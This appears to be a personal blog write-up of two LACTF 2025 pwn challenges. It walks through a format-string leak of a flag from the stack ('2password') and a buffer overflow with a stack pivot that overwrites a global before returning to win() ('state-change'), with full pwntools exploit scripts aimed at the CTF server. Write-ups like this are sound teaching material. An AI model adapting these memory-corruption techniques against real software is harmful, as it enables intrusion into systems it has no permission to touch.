---
title: "LACTF-2025"
date: 2024-10-02 00:00:00 +0800
categories: [pwn]
tags: [pwn,pivot,ret2gets,heap-overflow]
---

in this competition , i completed four chall . In the **Minecraft** chall , i also learned a lot about the ret2gets technique  

dowload file : [here](/assets/files/LACTF-2025.zip)
![score](assets/images/score.png)

# 2password

## reverse 

- this is warm-up chall , we will be entered 3 times , open the flag.txt  and read it into the stack

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void readline(char *buf, size_t size, FILE *file) {
  if (!fgets(buf, size, file)) {
    puts("wtf");
    exit(1);
  }
  char *end = strchr(buf, '\n');
  if (end) {
    *end = '\0';
  }
}

int main(void) {
  setbuf(stdout, NULL);
  printf("Enter username: ");
  char username[42];
  readline(username, sizeof username, stdin);
  printf("Enter password1: ");
  char password1[42];
  readline(password1, sizeof password1, stdin);
  printf("Enter password2: ");
  char password2[42];
  readline(password2, sizeof password2, stdin);
  FILE *flag_file = fopen("flag.txt", "r");
  if (!flag_file) {
    puts("can't open flag");
    exit(1);
  }
  char flag[42];
  readline(flag, sizeof flag, flag_file);
  if (strcmp(username, "kaiphait") == 0 &&
      strcmp(password1, "correct horse battery staple") == 0 &&
      strcmp(password2, flag) == 0) {
    puts("Access granted");
  } else {
    printf("Incorrect password for user ");
    printf(username);
    printf("\n");
  }
}
```

- Next is to use strcmp to check our input, but it doesn't do anything, we need attention to the code below

```c
printf(username)
```

Ill use this code to find the offset to the flag

```python
def generate(start: int, end: int, specifier: str = "p", seperator: str = "."):
    """ Generate a simple payload """
    payload = b""
    for i in range(start, end):
        payload += f"%{i}${specifier}{seperator}".encode()
    return payload
```

'}' in hex byte is 0x7d : 

![fsb](assets/images/fsb.png)


script 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./chall_patched",checksec=False)
#libc = ELF("./libc.so.6")
#ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

#p = process()
p = remote('chall.lac.tf', 31142)

def generate(start: int, end: int, specifier: str = "p", seperator: str = "."):
    """ Generate a simple payload """
    payload = b""
    for i in range(start, end):
        payload += f"%{i}${specifier}{seperator}".encode()
    return payload

def fix(payload: bytes, seperator: str = "."):
    """ Unhex the payload and return as a string """
    rt = b""
    for i in payload.split(b'.')[:-1]: # the last one is empty
        i = i[2:] # removing the 0x
        if i[0] == 97: # remove the newline
            i = i[1:]
        rt += unhex(i)[::-1] # unhex and rev
    return rt

pl = generate(6,9)
p.sendlineafter(b'username: ',pl)

p.sendlineafter(b'password1: ',b'kuvee')
p.sendlineafter(b'password2: ',b'kuvee@@zzzzz')

p.recvuntil(b'Incorrect password for user ')
leak = p.recvline()
print(fix(leak))

p.interactive()
```

![flag](/assets/images/flag.png)

# state-change

- code is very short, we can reverse it easy , In the vuln() function there is a bug **bof** and win() func to get flag , but in **win** check **state** with **0xf1eeee2d** , we need to satisfy this condition to get flag

```c
#include <stdio.h>
#include <string.h>

char buf[0x500]; // Wow so useful
int state;
char errorMsg[0x70];

void win() {
    char filebuf[64];
    strcpy(filebuf, "./flag.txt");
    FILE* flagfile = fopen("flag.txt", "r");

    /* ********** ********** */
    // Note this condition in win()
    if(state != 0xf1eeee2d) {
        puts("\ntoo ded to gib you the flag");
        exit(1);
    }
    /* ********** ********** */
    
    if (flagfile == NULL) {
        puts(errorMsg);
    } else {
        char buf[256];
        fgets(buf, 256, flagfile);
        buf[strcspn(buf, "\n")] = '\0';
        puts("Here's the flag: ");
        puts(buf);
    }
}

void vuln(){
    char local_buf[0x20];
    puts("Hey there, I'm deaddead. Who are you?");
    fgets(local_buf, 0x30, stdin);
}

int main(){

    state = 0xdeaddead;
    strcpy(errorMsg, "Couldn't read flag file. Either create a test flag.txt locally and try connecting to the server to run instead.");

    setbuf(stdin, 0);
	setbuf(stdout, 0);

    vuln();
    
    return 0;
}
```

- i used **pivot** to change value of stage and return to **win** function to get flag

exp

```python
#!/usr/bin/python3

from pwn import *

context.binary = exe = ELF('./chall')

#p = process()
p = remote('chall.lac.tf', 31593)

stage = 0x0000000000404540
offset = 32
gets = 0x00000000004012D0
pl = b'a'*32 + p64(stage+0x10) + p64(gets)
input()
p.sendafter(b'Who are you?',pl)

pl2 = b'b'*15 + p64(0xF1EEEE2D) + b'a'*16 + p64(exe.sym.win)
input()
p.sendline(pl2)


p.interactive()
```

![flag2](/assets/images/flag2.png)